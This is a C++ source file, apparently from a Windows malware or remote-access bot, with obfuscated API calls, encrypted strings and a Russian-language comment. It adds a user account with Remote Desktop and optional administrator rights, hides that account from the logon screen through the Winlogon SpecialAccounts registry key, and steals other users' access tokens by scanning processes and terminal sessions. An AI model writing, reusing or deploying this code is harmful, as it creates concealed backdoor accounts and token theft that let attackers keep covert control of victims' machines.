#include "core\util.h"
#include "core\string.h"
#include "core\debug.h"
#include "core\reestr.h"
#include "core\process.h"
#include <gdiplus.h>
#include <Lmaccess.h>
#include <Sddl.h>
#include <LMErr.h>

namespace Users
{

static bool GetNameSid( WELL_KNOWN_SID_TYPE type, wchar_t* name, DWORD& c_name )
{
	bool ret = false;
	DWORD sidSize = SECURITY_MAX_SID_SIZE;
	SID* sid = (SID*)Mem::Alloc(sidSize);
	if( API(ADVAPI32, CreateWellKnownSid)( type, 0, sid, &sidSize ) )
	{
		wchar_t domain[32];
		DWORD c_domain = 32;
		SID_NAME_USE use;
		if( API(ADVAPI32, LookupAccountSidW)( 0, sid, name, &c_name, domain, &c_domain, &use ) )
		{
			ret = true;
		}
	}
	Mem::Free(sid);
	return ret;
}

static char* keyUserList = _CT_("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList");

bool AddRemoteUser( const char* name, const char* password, bool admin, bool hidden )
{
	bool ret = false;
	USER_INFO_1 ui;
	wchar_t wname[32], wpassword[32];
	Str::ToWideChar( name, -1, wname, 32 );
	Str::ToWideChar( password, -1, wpassword, 32 );
	ui.usri1_name = wname;
	ui.usri1_password = wpassword;
	ui.usri1_password_age = 0;
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = 0;
	ui.usri1_comment = 0;
	ui.usri1_flags = UF_SCRIPT | UF_PASSWD_CANT_CHANGE | UF_DONT_EXPIRE_PASSWD;
	ui.usri1_script_path = 0;
	if( API(NETAPI32, NetUserAdd)( 0, 1, (BYTE*)&ui, 0 ) != NERR_Success ) 
		return false;
	wchar_t group[128];
	DWORD c_group = 128;
	if( GetNameSid( WinBuiltinRemoteDesktopUsersSid, group, c_group ) )
	{
		LOCALGROUP_MEMBERS_INFO_3 mi;
		mi.lgrmi3_domainandname = wname;
		if( API(NETAPI32, NetLocalGroupAddMembers)( 0, group, 3, (BYTE*)&mi, 1 ) == NERR_Success )
		{
			if( admin )
			{
				c_group = 128;
				if( GetNameSid( WinBuiltinAdministratorsSid, group, c_group ) )
				{
					if( API(NETAPI32, NetLocalGroupAddMembers)( 0, group, 3, (BYTE*)&mi, 1 ) == NERR_Success )
					{
						ret = true;
					}
				}
			}
			else
				ret = true;
		}
	}
	if( ret && hidden ) //делаем юзера невидимым
	{
		Reestr r;
		if( r.Create( HKEY_LOCAL_MACHINE, DECODE_STRING(keyUserList) ) )
		{
			r.SetDWORD( name, 0 );
		}
	}
	return ret;
}

bool Delete( const char* name )
{
	bool ret = false;
	wchar_t wname[32];
	Str::ToWideChar( name, -1, wname, 32 );
	if( API(NETAPI32, NetUserDel)( 0, wname ) == NERR_Success ) 
		ret = true;
	Reestr r( HKEY_LOCAL_MACHINE, DECODE_STRING(keyUserList) );
	if( r.Valid() )
		r.DelValue(name);
	return ret;
}

struct StruStokenUser
{
	HANDLE token;
	char nameUser[128];
};

static bool TokenUserCallback( Process::ProcessInfo& pi, void* tag )
{
	HANDLE hprocess = API(KERNEL32, OpenProcess)( PROCESS_ALL_ACCESS, FALSE, pi.pid );
	bool ret = false;
	if( hprocess )
	{
		HANDLE token;
		if( API(ADVAPI32,OpenProcessToken)( hprocess, TOKEN_ALL_ACCESS, &token ) )
		{
			TOKEN_USER* tu;
			DWORD size;
			API(ADVAPI32, GetTokenInformation)( token, TokenUser, 0, 0, &size );
			tu = (TOKEN_USER*)Mem::Alloc(size);
			if( API(ADVAPI32, GetTokenInformation)( token, TokenUser, tu, size, &size ) )
			{
				char user[128], domain[128];
				DWORD sz_user = sizeof(user);
				DWORD sz_domain = sizeof(domain);
				SID_NAME_USE snu;
				if( API(ADVAPI32, LookupAccountSidA)( nullptr, tu->User.Sid, user, &sz_user, domain, &sz_domain, &snu ) )
				{
					Str::Lower(user);
					StruStokenUser* su = (StruStokenUser*)tag;
					if( Str::Cmp( user, su->nameUser ) == 0 )
					{
						su->token = token;
						ret = true;
					}
				}
			}
			Mem::Free(tu);
		}
		if( !ret ) API(KERNEL32, CloseHandle)(token);
	}	
	API(KERNEL32, CloseHandle)(hprocess);
	return ret;
}

HANDLE GetToken( const char* name )
{
	StruStokenUser su;
	su.token = 0;
	Str::Copy( su.nameUser, sizeof(su.nameUser), name );
	Str::Lower(su.nameUser);
	Process::ListProcess( TokenUserCallback, &su );
	if( su.token ) return su.token;

	PWTS_SESSION_INFO si = 0;
	DWORD count = 0;
	HANDLE token = 0;
	if( API(WTSAPI32, WTSEnumerateSessionsA)( WTS_CURRENT_SERVER_HANDLE, 0, 1, &si, &count ) )
	{
		for( uint i = 0; i < count; i++ )
		{
			char* name;
			DWORD sz_name;
			if( API(WTSAPI32, WTSQuerySessionInformationA)( WTS_CURRENT_SERVER_HANDLE, si[i].SessionId, WTSUserName, &name, &sz_name ) )
			{
				Str::Lower(name);
				if( Str::Cmp( su.nameUser, name ) == 0 )
				{
					token = 0;
					if( API(WTSAPI32, WTSQueryUserToken)( si[i].SessionId, &token ) )
						break;
				}
			}
		}
		API(WTSAPI32, WTSFreeMemory)(si);
	}
	return token;
}

}
